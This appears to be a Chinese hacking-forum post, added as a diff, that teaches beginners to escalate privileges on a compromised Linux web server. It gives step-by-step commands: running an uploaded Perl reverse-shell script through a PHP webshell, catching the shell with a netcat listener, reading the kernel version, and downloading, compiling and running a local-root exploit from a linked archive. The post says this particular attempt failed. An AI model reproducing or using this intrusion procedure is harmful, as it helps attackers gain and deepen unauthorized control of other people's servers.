@@ -1,0 +1,46 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+linux溢出提权(适合刚学习linux提权的朋友)
+D8888D主贴内容-------------------------------------------------------
+ 
+
+作者wjs
+qq 825680101
+
+我也是刚接触linux，谢谢师傅sunwear的指导。
+先在网站目录上传1.pl,是个反弹脚本
+Phpshell执行chmod +x 1.pl，给1.pl执行权限，图0
+ [img]http://t00ls.net/images/default/attachimg.gif[/img] [img]http://t00ls.net/attachments/month_1003/1003172218cae4e7d3f90c1bcb.jpg[/img][url=http://t00ls.net/attachment.php?aid=NDI1MHxlMjNjY2VjNnwxMjY4ODg2NzQ1fDE0MmZRc0lIYTJ2YkJIY3JEck1OUUtCU0NtWWdhNFk1ZHZWMFNoSFY5a0F0WW8w&nothumb=yes]链接标记下载[/url] (34.37 KB)
+昨天 22:18
+
+
+然后执行 ./1.pl 本机IP 1224
+
+然后本机监听nc -vv -l -p 1224，图1 反弹成功
+ [img]http://t00ls.net/images/default/attachimg.gif[/img] [img]http://t00ls.net/attachments/month_1003/1003172206c8c64d457a667cbb.jpg[/img][url=http://t00ls.net/attachment.php?aid=NDI0NXxhODg4ZmZjZnwxMjY4ODg2NzQ1fDE0MmZRc0lIYTJ2YkJIY3JEck1OUUtCU0NtWWdhNFk1ZHZWMFNoSFY5a0F0WW8w&nothumb=yes]链接标记下载[/url] (85.57 KB)
+昨天 22:06
+
+
+
+输入id
+bash-3.2$ id
+uid=529(zeicom) gid=525(zeicom) groups=525(zeicom)
+bash-3.2$
+这里uid=529(zeicom)还不是root权限，输入uname –r
+返回：2.6.18-164.11.1.el5PAE
+
+找对应的exp, 这里地址整理很齐全可以这里下
+[url=http://bbs.tian6.com/linux_exp/index.htm]链接标记http://bbs.tian6.com/linux_exp/index.htm[/url] 
+
+命令输入pwd,这个命令是显示当前目录，当前目录就是shell的目录，我在shell上传2.c
+然后命令输入
+Gcc –o 2 2.c  //把2.c编译成可执行文件
+chmod +x 2 //给2有执行权限
+./2 //执行2,2是溢出的 exp文件。图2
+ [img]http://t00ls.net/images/default/attachimg.gif[/img] [img]http://t00ls.net/attachments/month_1003/1003172206c69fefbb11d55872.jpg[/img][url=http://t00ls.net/attachment.php?aid=NDI0Nnw4YzgwZDgwYXwxMjY4ODg2NzQ1fDE0MmZRc0lIYTJ2YkJIY3JEck1OUUtCU0NtWWdhNFk1ZHZWMFNoSFY5a0F0WW8w&nothumb=yes]链接标记下载[/url] (31.22 KB)
+昨天 22:06
+
+
+
+看图可以发现没提权成功，过程就是这样。以后遇到linux可以这样提权。不会linux提权的朋友可以学习下，会有所收获的。
